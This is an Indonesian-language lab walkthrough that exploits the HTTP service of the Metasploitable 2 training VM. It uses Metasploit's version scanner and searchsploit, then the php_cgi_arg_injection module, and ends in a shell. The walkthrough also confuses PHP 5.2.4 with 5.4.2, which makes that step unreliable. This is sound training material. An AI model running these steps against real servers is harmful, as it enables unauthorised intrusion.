# Exploit Port 80 (HTTP)
- Buka halaman web yang ada di server metasploitable 2 melalui browser dengan url `http://IP_Metasploitable2`

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%201.JPG)

- Buka msfconsole di terminal
```sh
msfconsole
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%202.JPG)

- Gunakan modul `auxiliary/scanner/http/http_version` untuk mengetahui web server yang digunakan di server
```sh
use auxiliary/scanner/http/http_version
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%203.JPG)

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini semua parameter wajib sudah terisi secara default kecuali parameter `RHOSTS`
```sh
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%204.JPG)

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%205.JPG)

- Jalankan modul tersebut. Setelah dijalankan didapat informasi bahwa web server yang digunakan adalah apache versi `2.2.8` dan menggunakan PHP versi `5.2.4`
```sh
run
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%206.JPG)

- Gunakan tool `searchploit` untuk mencari celah keamanan dari apache versi `2.2.8` dan filter berdasarkan keyword `php`. Disini terdapat informasi bahwa kelamahan PHP versi `5.4.2` adalah `cgi-bin Remote Code`
```sh
searchsploit apache 2.2.8 | grep php
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%207.JPG)

- Buka website CVE https://cve.mitre.org/ dan pilih menu Search CVE List

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%208.JPG)

- Ketikkan di kolom pencarian `php 5.4.2` lalu tekan submit

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%209.JPG)

- Dari hasil pencarian juga didapat informasi bahwa php 5.4.2 rentan dengan CGI script

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%2010.JPG)

- Buka kembali tool metasploit dan lakukan pencarian modul exploit untuk php 5.4.2
```sh
search php 5.4.2
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%2011.JPG)

-gunakan modul `exploit/multi/http/php_cgi_arg_injection` yang terdapat di list nomor 1
```sh
use <nomor_modul>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%2012.JPG)

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini kita hanya perlu mengisi parameter `RHOSTS` saja
```sh
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%2013.JPG)

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%2014.JPG)

- Jalankan modul tersebut
```sh
exploit
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%2015.JPG)

- Setelah dijalankan kita berhasil masuk ke shell server

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20HTTP/http%2016.JPG)